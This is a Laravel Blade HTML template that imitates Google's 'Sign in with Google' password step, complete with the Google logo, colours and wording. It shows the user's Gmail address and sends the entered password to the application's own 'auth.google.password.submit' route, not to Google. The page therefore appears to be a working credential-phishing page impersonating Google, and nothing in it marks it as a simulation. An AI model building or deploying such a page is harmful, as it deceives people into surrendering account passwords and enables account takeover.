<!DOCTYPE html>
<html lang="en" class="h-full bg-[#FFFFFF]">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Google - Password</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #F0F4F9;
        }
    </style>
</head>
<body class="min-h-full flex items-center justify-center p-4">
    <div class="max-w-[450px] w-full bg-white border border-[#dadce0] rounded-lg p-10 shadow-sm space-y-6">
        <!-- Google Logo -->
        <div class="flex flex-col items-center space-y-4">
            <svg class="h-10 w-auto" viewBox="0 0 24 24" width="24" height="24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
            </svg>
            <div class="text-center space-y-1">
                <h1 class="text-2xl font-normal text-[#202124]">Welcome</h1>
                <p class="text-sm text-[#202124]">{{ session('google_auth_gmail') }}</p>
            </div>
        </div>

        <!-- Password Form -->
        <form action="{{ route('auth.google.password.submit') }}" method="POST" class="space-y-6">
            @csrf

            <!-- Errors Handler Alert -->
            @if ($errors->any())
                <div class="rounded-lg bg-red-100 border border-red-200 p-3 text-xs text-red-650 space-y-0.5">
                    @foreach ($errors->all() as $error)
                        <p>{{ $error }}</p>
                    @endforeach
                </div>
            @endif

            <!-- Password Input -->
            <div>
                <label for="password" class="sr-only">Enter your password</label>
                <div class="relative">
                    <input type="password" name="password" id="password" required autofocus
                           class="w-full pl-4 pr-10 py-3.5 border border-[#dadce0] rounded text-sm text-[#202124] focus:outline-none focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8] transition-all"
                           placeholder="Enter your password">
                    <button type="button" onclick="togglePasswordVisibility('password', 'password-eye-icon')" class="absolute inset-y-0 right-0 pr-3 flex items-center text-[#5f6368] hover:text-[#202124]">
                        <svg id="password-eye-icon" class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                        </svg>
                    </button>
                </div>
                <div class="text-right mt-2">
                    <a href="#" onclick="event.preventDefault(); document.getElementById('forgot-form').submit();" class="text-xs text-[#1a73e8] font-medium hover:underline">Forgot password?</a>
                </div>
            </div>

            <!-- Footer Buttons -->
            <div class="flex items-center justify-between pt-4">
                <a href="{{ route('auth.google') }}" class="text-sm font-medium text-[#1a73e8] hover:text-[#174ea6] transition-colors">
                    Back
                </a>
                <button type="submit" class="bg-[#1a73e8] hover:bg-[#1b66ca] text-white text-sm font-medium px-6 py-2.5 rounded transition shadow-sm">
                    Next
                </button>
            </div>
        </form>

        <form id="forgot-form" action="{{ route('auth.google.forgot') }}" method="POST" class="hidden">
            @csrf
        </form>
    </div>
    <script>
        function togglePasswordVisibility(inputId, iconId) {
            const input = document.getElementById(inputId);
            const icon = document.getElementById(iconId);
            if (input.type === 'password') {
                input.type = 'text';
                icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.542-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.542 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />';
            } else {
                input.type = 'password';
                icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />';
            }
        }
    </script>
</body>
</html>
